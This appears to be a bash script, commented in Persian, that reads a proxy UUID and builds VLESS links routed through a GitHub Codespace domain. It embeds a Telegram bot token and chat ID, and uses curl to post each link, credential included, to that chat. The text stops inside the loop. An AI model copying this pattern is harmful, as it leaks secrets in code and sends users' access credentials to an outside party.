#!/bin/bash

CONFIG="/etc/config.json"

UUID=$(jq -r '.inbounds[0].settings.clients[0].id' "$CONFIG")

if [ -z "$UUID" ] || [ "$UUID" = "null" ]; then
  echo "[g2ray] UUID not found."
  exit 1
fi

SNI="${CODESPACE_NAME}-443.app.github.dev"

# لیست آیپی‌های سرورهای مختلف - هرچقدر اضافه کنی به همان تعداد کانفیگ می‌گیری
SERVERS=(
  "94.130.50.12"
  "104.198.14.52"
  "142.54.178.211"
  "138.201.54.122"
)

KINGS=(
  "CyrusTheGreat"
  "Cambyses"
  "DariusTheGreat"
  "Xerxes"
  "Artaxerxes"
  "DariusII"
  "ArtaxerxesII"
  "ArtaxerxesIII"
  "ArdashirI"
  "ShapurI"
  "ShapurII"
  "KhosrowI"
  "KhosrowII"
  "Hormizd"
  "YazdegerdI"
  "YazdegerdIII"
)

BOT_TOKEN="7843429722:AAGdb4texe8cErPbQycGsGzK2_4vpZiM0SI"
CHAT_ID="6920695217"

echo ""
echo "================================================"
echo "  Generating ${#SERVERS[@]} Configurations"
echo "================================================"

# به تعداد آیپی‌ها کانفیگ بساز
for SERVER in "${SERVERS[@]}"; do
  KING=${KINGS[$RANDOM % ${#KINGS[@]}]}
  RANDOM_ID=$(shuf -i 1000-9999 -n 1)
  NAME="${KING}-${RANDOM_ID}"
  
  LINK="vless://${UUID}@${SERVER}:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#${NAME}"
  
  echo ""
  echo "================================================"
  echo "  $LINK"
  echo "================================================"
  
  # SEND TO TELEGRAM
  curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
    -d chat_id="${CHAT_ID}" \
    --data-urlencode text="$LINK" > /dev/null 2>&1
